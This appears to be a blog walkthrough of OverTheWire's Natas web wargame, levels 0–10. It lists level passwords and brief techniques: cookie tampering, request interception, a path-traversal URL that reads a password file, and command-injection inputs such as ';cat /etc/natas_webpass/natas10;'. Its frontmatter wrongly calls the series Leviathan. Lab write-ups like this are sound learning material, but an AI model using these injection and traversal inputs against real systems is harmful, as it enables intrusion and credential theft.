---
title: 'Over The Wire - Natas'
date: '2023-04-19'
tags: ['Info Sec', 'Linux']
draft: false
summary: 'Walkthrough of each level of Over the Wire's Leviathan series. Its a CLI game which helps players master Linux, SSH, and much more.'
layout: PostSimple
bibliography: references-data.bib
canonicalUrl:
---

## Level 0

natas0

Search HTML for pw

## Level 1

PW in HTML, but must open source with hotkeys

## Level 2

h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7

Flag isn't on the page, but a file inside a resource at this path.

http://natas2.natas.labs.overthewire.org/files/users.txt

## Level 3

G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q

Flag isn't inside that file but robots.txt, a disallowed route

http://natas3.natas.labs.overthewire.org/robots.txt

http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt

## level 4

natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm

Use Burp & ProxyFoxy to intercept requests and change them before forwarding to
the server.

## level 5

Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD

Use JS console to change document cookie and refresh.

document.cookie="loggedin=1"

## level 6

fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR

Checkout a file that is included in the source code that the page points to.
http://natas6.natas.labs.overthewire.org/includes/secret.inc

## level 7

jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr

We can trick the server into showing us the page at that path using a query parameter.

http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8

## level 8

a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB

Use tehplayground.com to reverse engineer the encoded password thats being compared.

## level 9

Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd

https://www.alevsk.com/2020/01/ctf-overthewire-natas9/

Use command injection

;ls -la;
To see files on the server

;cat /etc/natas_webpass/natas10;

To read from a file on the server

## level 10

D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
